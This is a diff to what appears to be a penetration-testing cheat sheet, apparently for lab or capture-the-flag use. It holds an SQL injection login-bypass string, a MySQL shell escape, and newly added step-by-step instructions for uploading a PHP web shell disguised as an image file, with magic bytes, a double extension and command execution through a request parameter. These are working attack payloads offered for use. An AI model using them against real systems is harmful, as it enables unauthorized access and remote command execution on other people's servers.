@@ -9,9 +9,6 @@ python -m SimpleHTTPServer
 ### Bypass login
 (magic) Try SQL injection in the login form. Pass this as user and password: `' or 1 = 1--`
 
-### Inject shell into image
-(magic) Insert the magic bytes in the beginning of the file that indicate the file format.
-
 ### Enumeration
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
 
@@ -49,4 +46,8 @@ Run this from mysql to drop to a shell and see what user you are on:
 `\! /bin/sh`
 
 ### Injecting php shell in image file
-`{{imageMagicBytes}} <?php echo system($_REQUEST[\'ippsec']); ?>`
+- Upload a proper image with the intercept on
+- From the proxy, keep the following code as the "image"'s content: `{{imageMagicBytes}} <?php echo system($_REQUEST['whatever']); ?>`
+- Also change the file name and append `.php` (if the image name is image.gif, it would be image.gif.php)
+- Access the file from the browser and add `?whatever={{command}}`
+
